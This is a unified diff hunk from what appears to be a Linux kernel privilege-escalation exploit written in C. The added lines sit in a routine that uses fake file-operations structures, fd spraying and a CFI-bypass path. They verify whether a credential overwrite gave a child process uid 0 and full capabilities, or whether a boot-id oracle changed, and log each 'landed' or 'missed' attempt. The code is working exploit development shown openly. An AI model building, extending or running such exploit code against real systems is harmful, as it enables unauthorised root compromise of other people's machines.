@@ -2007,9 +2007,31 @@ void do_pselect_fake_lock_route(void) {
          * Main may PLAIN-STORE NULL into fake_fops.llseek then open.
          * Do not sleep in this worker — that pinned core 7 and blocked
          * the in-process repair walk. Spray fds stay in the process. */
+        if (cred_mode || oracle_mode) {
+          /* NOCFFI arm previously swallowed ALL custom writes with an
+           * unconditional route_verified — the cred/oracle punches never
+           * reached their landing checks (08-30 fire). Same checked
+           * retry here before deciding. */
+          int landed = cred_mode ? uid0_child_capeff_landed()
+                                 : bootid_changed();
+          if (landed) {
+            route_verified = 1;
+            pr_info("%s LANDED attempt=%d/%d (nocfi arm)\n",
+                    cred_mode ? "CRED" : "ORACLE", route_attempt, max_att);
+            live_sync_log("UID0", cred_mode ? "cred_landed" : "oracle_landed");
+            durable_proof_log(cred_mode ? "uid0_cred_LANDED"
+                                        : "oracle_LANDED");
+          } else {
+            pr_info("%s punch miss attempt=%d/%d - re-stamp (nocfi arm)\n",
+                    cred_mode ? "cred" : "oracle", route_attempt, max_att);
+            live_sync_log("UID0",
+                          cred_mode ? "cred_punch_miss" : "oracle_punch_miss");
+          }
+        } else {
         pr_info("SWAP_NOCFI: skipping post-walk cfi probe fake_fops=%016zx\n",
                 fake_fops);
         route_verified = 1;
+        }
       } else if (pselect_custom_write_enabled()) {
         if (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0) &&
             g_bootid_before[0]) {
